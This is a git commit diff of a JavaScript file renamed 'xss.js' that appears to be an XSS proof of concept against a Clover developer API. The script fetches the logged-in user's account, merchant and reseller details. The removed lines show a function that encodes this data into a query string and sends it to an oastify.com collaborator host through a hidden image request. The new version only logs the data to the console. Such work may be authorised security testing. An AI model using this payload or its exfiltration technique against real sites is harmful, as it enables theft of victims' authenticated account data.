f8dc50296a8104745736fe3ff25790b90dffa833
ZhenwarX <61203950+ZhenwarX@users.noreply.github.com>
2024-01-23 16:51:00 +0000

    Update t.js

--- t.js
+++ t.js
@@ -1,7 +1,7 @@
-// t.js
+// xss.js
 
 function fetchData() {
-  const url = 'https://dev1.dev.clover.com/v3/accounts/current?expand=primaryDeveloper%2CprimaryEnterprise%2CprimaryMerchant%2CprimaryMerchant.properties%2CprimaryReseller&_=1706027175630';
+  const url = 'https://dev1.dev.clover.com/v3/accounts/current?expand=primaryDeveloper%2CprimaryEnterprise%2CprimaryMerchant%2CprimaryMerchant.properties%2CprimaryReseller';
   const headers = new Headers({ 'Content-Type': 'application/json' });
 
   fetch(url, { 
@@ -16,35 +16,11 @@ function fetchData() {
     return response.json();
   })
   .then(data => {
-    // Send the data to https://myservetest.com/data= using a GET request
-    sendDataToServer(data);
+    console.log(data);
   })
   .catch(error => {
     console.error('Fetch error:', error);
   });
-}
-
-function sendDataToServer(data) {
-  // Convert the data object into a query string
-  const queryString = Object.entries(data)
-    .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
-    .join('&');
-
-  // Append the query string to the server URL
-  const serverUrl = `https://c2fq7n1w3o03o2klrgvmut5cl3rufo3d.oastify.com/data=?${queryString}`;
-
-  // Use an Image object to send a GET request
-  const img = new Image();
-  img.src = serverUrl;
-
-  // Log success or error
-  img.onload = function() {
-    console.log('Data successfully sent to the server.');
-  };
-
-  img.onerror = function() {
-    console.error('Error sending data to the server.');
-  };
 }
 
 // Call the fetchData function when the script is loaded
